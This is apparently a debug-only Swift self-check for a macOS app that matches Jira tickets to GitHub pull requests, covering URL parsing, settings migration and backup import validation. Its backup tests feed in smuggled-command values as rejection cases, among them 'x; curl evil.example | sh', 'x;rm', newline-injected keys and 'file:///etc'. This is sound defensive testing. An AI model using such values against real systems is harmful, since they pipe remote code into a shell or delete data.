#if DEBUG
import Foundation

/// Runnable check for PR-discovery logic. DEBUG only, and only with
/// `TR_SELFCHECK=1`; exits 0 on success, 1 on the first failure:
///
/// ```bash
/// TR_SELFCHECK=1 "<BUILT_PRODUCTS_DIR>/TicketRadar.app/Contents/MacOS/TicketRadar"; echo "exit=$?"
/// ```
///
/// Uses `guard` + `exit(1)` instead of `assert`, which optimized builds strip.
@MainActor
enum DebugSelfCheck {
    static var isEnabled: Bool {
        ProcessInfo.processInfo.environment["TR_SELFCHECK"] == "1"
    }

    static func run() -> Never {
        // 1. Plain hyperlinks (ADF link marks) are not linked PRs; inlineCards are.
        let adf: [String: Any] = ["content": [
            ["type": "text", "text": "see",
             "marks": [["type": "link", "attrs": ["href": "https://github.com/Org/Repo/pull/126#discussion_r1"]]]],
            ["type": "inlineCard", "attrs": ["url": "https://github.com/Org/Repo/pull/7"]],
        ]]
        check(JiraService.extractPRURLs(from: adf) == ["https://github.com/Org/Repo/pull/7"],
              "link marks must be ignored, inlineCards kept")

        // 2. URL variants collapse to one key; stored URL keeps its case.
        let variants = [
            "https://github.com/Org/Repo/pull/12",
            "https://github.com/Org/Repo/pull/12/files",
            "https://github.com/Org/Repo/pull/12#x",
            "https://github.com/Org/Repo/pull/12?w=1",
            "https://github.com/org/repo/pull/12",
        ]
        check(Set(variants.map(GitHubService.prKey)).count == 1, "PR URL variants must share one key")
        check(GitHubService.normalizePRURL(variants[1]) == variants[0], "normalize must keep case and drop sub-pages")
        check(GitHubService.normalizePRURL("not a url") == "not a url", "unparseable URLs pass through unchanged")

        // 3. Whole-key title match.
        check(!GitHubService.titleMentions("[DATA-8332] x", key: "DATA-833"), "DATA-833 must not match DATA-8332")
        check(GitHubService.titleMentions("[data-833] x", key: "DATA-833"), "match is case-insensitive")
        check(!GitHubService.titleMentions("XDATA-833 x", key: "DATA-833"), "no match inside a longer word")

        // 4. Owner resolution: prefix map, then default.
        let settings = AppSettings(githubOwner: "Default-Org", githubOwners: AppSettings.parseProjectMap("data = Data-Org\nbad line").orgs)
        check(settings.githubOwner(forTicketKey: "DATA-1") == "Data-Org", "mapped prefix must win")
        check(settings.githubOwner(forTicketKey: "API-1") == "Default-Org", "unmapped prefix uses default")

        // 4b. Project lines: site and org optional, either order; round trip is lossless.
        let projects = AppSettings.parseProjectMap("""
            DATA = acme.atlassian.net, Data-Org
            api = Health-Org, https://acme-labs.atlassian.net/
            OPS = acme.atlassian.net
            nothing here
            """)
        check(projects.orgs == ["DATA": "Data-Org", "API": "Health-Org"], "project lines: orgs")
        check(projects.sites == ["DATA": "acme.atlassian.net", "API": "acme-labs.atlassian.net", "OPS": "acme.atlassian.net"],
              "project lines: sites")
        let reparsed = AppSettings.parseProjectMap(AppSettings.formatProjectMap(orgs: projects.orgs, sites: projects.sites))
        check(reparsed.orgs == projects.orgs && reparsed.sites == projects.sites, "format → parse must lose nothing")

        // 4c. Jira site: prefix map, then base URL host, then none. Links follow the site.
        let jira = AppSettings(jiraBaseURL: "https://acme.atlassian.net/", jiraSites: ["API": "acme-labs.atlassian.net"])
        check(jira.jiraSite(forTicketKey: "API-1") == "acme-labs.atlassian.net", "mapped Jira site must win")
        check(jira.jiraSite(forTicketKey: "OPS-1") == "acme.atlassian.net", "unmapped prefix uses base URL host")
        check(AppSettings().jiraSite(forTicketKey: "OPS-1") == nil, "no site configured → no switch")
        check(jira.browseURL(for: "API-1")?.absoluteString == "https://acme-labs.atlassian.net/browse/API-1",
              "link uses the prefix's site")
        check(jira.browseURL(for: "OPS-1")?.absoluteString == "https://acme.atlassian.net/browse/OPS-1",
              "link falls back to base URL")

        // 4d. Site gate: overlapping fetches never cross sites; retry only after a skipped switch.
        check(waitFor { await siteGateCheck() }, "site gate")

        // 5. settings.json from before the prefix map still decodes.
        let oldSettings = #"{"pollIntervalMinutes":5,"notificationsEnabled":true,"githubOwner":"X"}"#
        let decoded = try? JSONDecoder().decode(AppSettings.self, from: Data(oldSettings.utf8))
        check(decoded?.githubOwner == "X" && decoded?.githubOwners == nil && decoded?.jiraSites == nil,
              "old settings.json must decode")

        // 6. Tickets saved before searchPRURLs/ssoBlockedOrg still decode, then migrate.
        let old = WatchedTicket(ticketKey: "DATA-1", knownPRURLs: ["https://github.com/Org/Repo/pull/5#discussion_r9"])
        let encoder = JSONEncoder()
        encoder.dateEncodingStrategy = .iso8601
        let decoder = JSONDecoder()
        decoder.dateDecodingStrategy = .iso8601
        guard let data = try? encoder.encode([old]),
              let json = String(data: data, encoding: .utf8),
              !json.contains("searchPRURLs"),
              let loaded = try? decoder.decode([WatchedTicket].self, from: data) else {
            fail("old tickets.json must decode")
        }
        check(TicketStore.migratePRURLs(loaded).first?.knownPRURLs == ["https://github.com/Org/Repo/pull/5"],
              "migration must canonicalize knownPRURLs")

        // 7. Backup export and import (T1–T13 in docs/plans/import-export.md).
        backupChecks()
        backupFileChecks()

        print("TR_SELFCHECK: all checks passed")
        exit(0)
    }

    // MARK: - Backup

    private static let t0 = Date(timeIntervalSince1970: 1_790_000_000) // whole second: ISO 8601 drops fractions

    private static func pr(_ number: Int, _ url: String? = nil) -> PullRequest {
        PullRequest(url: url ?? "https://github.com/Acme/api-gateway/pull/\(number)",
                    repository: "api-gateway", number: number, title: "PR \(number)", createdAt: t0)
    }

    /// A hand-made backup file, able to hold what `export` never writes.
    private static func backupFile(_ tickets: [WatchedTicket], _ settings: AppSettings = AppSettings()) -> Data {
        try! Backup.encoder.encode(Backup(version: Backup.currentVersion, exportedAt: t0, tickets: tickets, settings: settings))
    }

    private static func merge(_ data: Data, _ tickets: [WatchedTicket] = [], _ settings: AppSettings = AppSettings()) -> Backup.Result {
        do { return try Backup.merge(data, into: tickets, settings: settings) } catch { fail("merge threw \(error)") }
    }

    private static func mergeError(_ data: Data) -> BackupError? {
        do { _ = try Backup.merge(data, into: [], settings: AppSettings()); return nil } catch { return error as? BackupError }
    }

    private static func backupChecks() {
        // T1: round trip keeps archived state and the archived PR snapshot.
        let archived = WatchedTicket(ticketKey: "DEMO-4502", title: "Old", pullRequests: [pr(121)],
                                     lastRefreshed: t0, status: .ready, isArchived: true)
        let active = WatchedTicket(ticketKey: "DEMO-4821", pullRequests: [pr(142)], lastRefreshed: t0, status: .ready)
        guard let exported = try? Backup.export(tickets: [active, archived], settings: AppSettings()) else { fail("T1 export threw") }
        let r1 = merge(exported)
        let a1 = r1.tickets.first { $0.ticketKey == "DEMO-4502" }
        check(a1?.isArchived == true && a1?.pullRequests.map(\.url) == [pr(121).url]
              && a1?.lastRefreshed == t0 && a1?.status == .ready && a1?.title == "Old",
              "T1 archived ticket keeps its state and PR snapshot")
        check(r1.summary.addedActive == 1 && r1.summary.addedArchived == 1, "T1 counts active and archived")

        // T2: watched keys are skipped, file duplicates imported once, ids are new.
        let mine = WatchedTicket(ticketKey: "DEMO-1", title: "mine")
        let r2 = merge(backupFile([WatchedTicket(ticketKey: "demo-1", title: "theirs"), WatchedTicket(ticketKey: "DEMO-2"),
                                   WatchedTicket(ticketKey: "DEMO-2"), WatchedTicket(id: mine.id, ticketKey: "DEMO-3")]), [mine])
        check(r2.tickets.filter { $0.ticketKey == "DEMO-1" }.map(\.title) == ["mine"], "T2 watched ticket keeps this Mac's data")
        check(r2.tickets.filter { $0.ticketKey == "DEMO-2" }.count == 1, "T2 key repeated in the file imported once")
        check(Set(r2.tickets.map(\.id)).count == r2.tickets.count, "T2 imported tickets get new ids")
        check(r2.summary.skipped == 2, "T2 skipped count")

        // T3: Projects entries — missing ones added, existing ones kept, unsafe ones dropped.
        let mac3 = AppSettings(githubOwners: ["DATA": "acme-data"], jiraSites: ["DATA": "acme.atlassian.net"])
        let file3 = AppSettings(
            githubOwners: [" ops ": "acme-ops", "DATA": "acme-health", "API": "", "DOTORG": "acme.org",
                           "NL": "acme\nQ = evil", "DATA\n": "acme-x", "DATA = acme-health\nAPI": "acme-health",
                           "PAD": " acme-x ", "DUP": "acme-up", "dup": "acme-low", "SH": "x;curl", "BAD PREFIX": "acme-z"],
            jiraSites: ["WEB": "https://acme-labs.atlassian.net/", "NODOT": "acme", "EVIL": "evil.example;curl x|sh"])
        let r3 = merge(backupFile([], file3), [], mac3)
        let orgs3 = r3.settings.githubOwners ?? [:], sites3 = r3.settings.jiraSites ?? [:]
        check(orgs3 == ["DATA": "acme-data", "OPS": "acme-ops", "PAD": "acme-x", "DUP": "acme-up"], "T3 orgs merged and validated")
        check(sites3 == ["DATA": "acme.atlassian.net", "WEB": "acme-labs.atlassian.net"], "T3 sites merged and validated")
        check(r3.summary.addedMappings == 4 && r3.summary.droppedMappings == 9, "T3 added and dropped counts")
        let cycled = AppSettings.parseProjectMap(AppSettings.formatProjectMap(orgs: orgs3, sites: sites3))
        check(cycled.orgs == orgs3 && cycled.sites == sites3, "T3 entries survive a Settings save unchanged")
        // Dictionary order is random per run: 16 case-only pairs per map make an
        // unsorted merge fail all but 1 in 65,536 runs.
        var orgsCase: [String: String] = [:], sitesCase: [String: String] = [:]
        for i in 0..<16 {
            orgsCase["DUP\(i)"] = "acme-up"; orgsCase["dup\(i)"] = "acme-low"
            sitesCase["WEB\(i)"] = "acme.atlassian.net"; sitesCase["web\(i)"] = "acme-labs.atlassian.net"
        }
        let rCase = merge(backupFile([], AppSettings(githubOwners: orgsCase, jiraSites: sitesCase))).settings
        check(Set((rCase.githubOwners ?? [:]).values) == ["acme-up"] && Set((rCase.jiraSites ?? [:]).values) == ["acme.atlassian.net"],
              "T3 prefixes differing only in case resolve the same way every run")

        // T4: customToolPath is neither exported nor imported.
        let path4 = try? Backup.export(tickets: [], settings: AppSettings(customToolPath: "/opt/someone/bin"))
        check(path4.map { !String(decoding: $0, as: UTF8.self).contains("someone") } == true, "T4 Custom PATH not exported")
        check(merge(backupFile([], AppSettings(customToolPath: "/tmp/evil")), [], AppSettings(customToolPath: "/opt/mine"))
                .settings.customToolPath == "/opt/mine", "T4 Custom PATH not imported")
        check(merge(backupFile([], AppSettings(customToolPath: "/tmp/evil"))).settings.customToolPath == nil,
              "T4 Custom PATH not imported when unset")

        // T5: ticket keys validated as whole strings.
        let r5 = merge(backupFile(["--web", "PROJ", "1A-2", "DEMO-1\n", "MY_PROJ-12", "demo-1"].map { WatchedTicket(ticketKey: $0) }))
        check(Set(r5.tickets.map(\.ticketKey)) == ["MY_PROJ-12", "DEMO-1"], "T5 valid keys accepted")
        check(r5.summary.droppedKeys == ["--web", "PROJ", "1A-2", "DEMO-1\n"], "T5 invalid keys dropped and listed")

        // T6: only https://github.com/{owner}/{repo}/pull/{n} survives, normalized.
        let urls6 = ["https://[github.com/a/pull/1", "file:///x?github.com/pull/1", "https://evil.example/a/b/pull/1", "",
                     "https://github.com/Acme/api-gateway/pull/9/files"]
        let r6 = merge(backupFile([WatchedTicket(ticketKey: "DEMO-6", pullRequests: urls6.enumerated().map { pr($0.offset, $0.element) },
                                                 isArchived: true)]))
        check(r6.tickets.first?.pullRequests.map(\.url) == ["https://github.com/Acme/api-gateway/pull/9"], "T6 valid PR kept, normalized")
        check(r6.summary.droppedPRs == 4, "T6 invalid PRs dropped and counted")

        // T7: newer versions and non-backup JSON are rejected.
        let v1 = String(decoding: backupFile([WatchedTicket(ticketKey: "DEMO-7")]), as: UTF8.self)
        check(mergeError(Data(v1.replacingOccurrences(of: "\"version\" : 1", with: "\"version\" : 2").utf8)) == .newerVersion,
              "T7 newer version rejected")
        check(mergeError(Data(v1.replacingOccurrences(of: "\"version\" : 1", with: "\"version\" : 0").utf8)) == .notABackup,
              "T7 version 0 rejected")
        check(mergeError(Data(#"{"foo": 1}"#.utf8)) == .notABackup && mergeError(Data("[]".utf8)) == .notABackup,
              "T7 non-backup JSON rejected")

        // T8: no imported ticket keeps its search cache or sign-in banners;
        // active ones also lose their PR snapshot and wait for a refresh.
        var active8 = WatchedTicket(ticketKey: "DEMO-8", pullRequests: [pr(1)], status: .ready, knownPRURLs: [pr(1).url])
        var archived8 = WatchedTicket(ticketKey: "DEMO-9", pullRequests: [pr(3)], status: .ready, isArchived: true)
        for i in [0, 1] {
            var t = i == 0 ? active8 : archived8
            t.searchPRURLs = [pr(2).url]
            t.ssoBlockedOrg = "acme-data"
            t.jiraLoginSite = "x; curl evil.example | sh"
            if i == 0 { active8 = t } else { archived8 = t }
        }
        let r8 = merge(backupFile([active8, archived8]))
        let a8 = r8.tickets.first { $0.ticketKey == "DEMO-8" }, b8 = r8.tickets.first { $0.ticketKey == "DEMO-9" }
        check(a8?.status == .idle && a8?.pullRequests.isEmpty == true && a8?.knownPRURLs == [pr(1).url],
              "T8 active ticket: idle, no PR snapshot, PRs already seen kept")
        check(b8?.isArchived == true && b8?.status == .ready && b8?.pullRequests.count == 1, "T8 archived ticket keeps its snapshot")
        check([a8, b8].allSatisfy { ($0?.searchPRURLs ?? []).isEmpty && $0?.ssoBlockedOrg == nil && $0?.jiraLoginSite == nil },
              "T8 no search cache or sign-in banners imported")

        // T9: settings restored; interval range-checked; defaults only when empty here.
        let mac9 = AppSettings(pollIntervalMinutes: 5, notificationsEnabled: true)
        let r9 = merge(backupFile([], AppSettings(pollIntervalMinutes: 12, notificationsEnabled: false,
                                                  jiraBaseURL: "https://acme.atlassian.net", githubOwner: "acme-data")), [], mac9)
        check(r9.settings.pollIntervalMinutes == 12 && !r9.settings.notificationsEnabled
              && r9.settings.jiraBaseURL == "https://acme.atlassian.net" && r9.settings.githubOwner == "acme-data",
              "T9 settings restored")
        for bad in [0, -1, Int.max] {
            check(merge(backupFile([], AppSettings(pollIntervalMinutes: bad)), [], mac9).settings.pollIntervalMinutes == 5,
                  "T9 poll interval \(bad) ignored")
        }
        let set9 = AppSettings(jiraBaseURL: "https://mine.atlassian.net", githubOwner: "mine")
        for file9 in [AppSettings(jiraBaseURL: "https://acme.atlassian.net", githubOwner: "acme-data"),
                      AppSettings(jiraBaseURL: "", githubOwner: "")] {
            let s = merge(backupFile([], file9), [], set9).settings
            check(s.jiraBaseURL == "https://mine.atlassian.net" && s.githubOwner == "mine", "T9 this Mac's defaults kept")
        }
        let unsafe9 = merge(backupFile([], AppSettings(jiraBaseURL: "file:///etc", githubOwner: "x;rm"))).settings
        check(unsafe9.jiraBaseURL == nil && unsafe9.githubOwner == nil, "T9 unsafe defaults not restored")

        // T11: saves run tickets first and report which part failed.
        var settingsSaved = false
        check(Backup.commit(saveTickets: { throw BackupError.notAFile }, saveSettings: { settingsSaved = true }) == .ticketsFailed
              && !settingsSaved, "T11 failed tickets save stops before settings")
        check(Backup.commit(saveTickets: {}, saveSettings: { throw BackupError.notAFile }) == .settingsFailed,
              "T11 failed settings save reported")
        check(Backup.commit(saveTickets: {}, saveSettings: {}) == .saved, "T11 both saved")

        // T12: the alert lists 10 dropped keys, each at most 40 characters.
        var s12 = Backup.Summary()
        s12.droppedKeys = (1...25).map { "BAD\($0)" }
        check(s12.alertText.contains("BAD10, and 15 more") && !s12.alertText.contains("BAD11"), "T12 first 10 keys, then the rest counted")
        let long12 = String(repeating: "X", count: 20) + "\n" + String(repeating: "Y", count: 979)
        let short12 = String(repeating: "X", count: 20) + "⏎" + String(repeating: "Y", count: 18) + "…"
        s12.droppedKeys = [long12]
        check(Backup.Summary.shortened(long12) == short12 && s12.alertText.contains(short12)
              && !s12.alertText.contains(String(repeating: "Y", count: 19)), "T12 long key shortened to 40 characters")

        // T13: an export Import would refuse is refused.
        let huge = WatchedTicket(ticketKey: "DEMO-13", title: String(repeating: "x", count: Backup.maxBytes + 1))
        do { _ = try Backup.export(tickets: [huge], settings: AppSettings()); fail("T13 oversized export not refused") }
        catch { check(error as? BackupError == .exportTooLarge, "T13 oversized export refused") }
    }

    /// T10: `Backup.read` refuses large files, links to them and FIFOs.
    private static func backupFileChecks() {
        let fm = FileManager.default
        let dir = fm.temporaryDirectory.appendingPathComponent("tr-selfcheck-\(UUID().uuidString)")
        guard (try? fm.createDirectory(at: dir, withIntermediateDirectories: true)) != nil else { fail("T10 temp folder") }
        defer { try? fm.removeItem(at: dir) }
        func readError(_ url: URL) -> BackupError? {
            do { _ = try Backup.read(url); return nil } catch { return error as? BackupError }
        }

        let big = dir.appendingPathComponent("big.json")
        fm.createFile(atPath: big.path, contents: nil)
        guard let handle = try? FileHandle(forWritingTo: big),
              (try? handle.truncate(atOffset: UInt64(Backup.maxBytes + 1))) != nil else { fail("T10 sparse file") }
        try? handle.close()
        check(readError(big) == .fileTooLarge, "T10 file over 10 MB refused")

        let link = dir.appendingPathComponent("link.json")
        guard (try? fm.createSymbolicLink(at: link, withDestinationURL: big)) != nil else { fail("T10 symlink") }
        check(readError(link) == .fileTooLarge, "T10 link to a large file refused")

        let fifo = dir.appendingPathComponent("fifo.json")
        guard mkfifo(fifo.path, 0o600) == 0 else { fail("T10 FIFO") }
        check(readError(fifo) == .notAFile, "T10 FIFO refused without blocking")

        let small = dir.appendingPathComponent("small.json")
        fm.createFile(atPath: small.path, contents: Data("{}".utf8))
        check((try? Backup.read(small)) == Data("{}".utf8), "T10 small file read")
    }

    private static func check(_ condition: Bool, _ message: String) {
        if !condition { fail(message) }
    }

    /// Run an async check to completion from this synchronous launch path.
    /// Safe to block the main thread: the check never touches the main actor.
    private static func waitFor(_ check: @escaping @Sendable () async -> Bool) -> Bool {
        final class Box: @unchecked Sendable { var value = false }
        let box = Box()
        let done = DispatchSemaphore(value: 0)
        Task.detached {
            box.value = await check()
            done.signal()
        }
        done.wait()
        return box.value
    }

    private static func fail(_ message: String) -> Never {
        FileHandle.standardError.write(Data("TR_SELFCHECK FAILED: \(message)\n".utf8))
        exit(1)
    }
}

// File-level on purpose: nothing here may inherit DebugSelfCheck's @MainActor,
// because waitFor blocks the main thread while this runs.

/// Fake acli: `active` is its global site; switching takes time, so an
/// unserialized gate lets another fetch run mid-switch.
private actor FakeACLI {
    var active: String?
    var switches = 0
    var crossed = false

    func switchTo(_ site: String) async {
        active = nil
        try? await Task.sleep(nanoseconds: 2_000_000)
        active = site
        switches += 1
    }

    func fetch(expecting site: String) async throws {
        try? await Task.sleep(nanoseconds: 2_000_000)
        if active != site {
            crossed = true
            throw ShellError.commandFailed(command: "acli", message: "", exitCode: 1, kind: .notFound)
        }
    }

    /// Simulates the user switching acli in a terminal behind the gate.
    func externallySwitch(to site: String) { active = site }
}

private func siteGateCheck() async -> Bool {
    let gate = JiraSiteGate()
    let fake = FakeACLI()
    let retryable: (Error) -> Bool = { ($0 as? ShellError)?.kind == .notFound }

    // Overlapping fetches on alternating sites must never see the wrong site.
    await withTaskGroup(of: Void.self) { group in
        for i in 0..<12 {
            let site = i.isMultiple(of: 2) ? "a.atlassian.net" : "b.atlassian.net"
            group.addTask {
                _ = try? await gate.run(site: site, switchSite: { await fake.switchTo($0) }, retryable: { _ in false }) {
                    try await fake.fetch(expecting: site)
                }
            }
        }
    }
    guard await !fake.crossed else { return false }

    func fetchB() async -> Bool {
        (try? await gate.run(site: "b.atlassian.net", switchSite: { await fake.switchTo($0) }, retryable: retryable) {
            try await fake.fetch(expecting: "b.atlassian.net")
        }) != nil
    }

    // Same site twice in a row → the second fetch does not switch.
    guard await fetchB() else { return false }
    let switches = await fake.switches
    guard await fetchB(), await fake.switches == switches else { return false }

    // Someone switched acli behind the gate → the skipped switch is retried once.
    await fake.externallySwitch(to: "other.atlassian.net")
    return await fetchB()
}
#endif
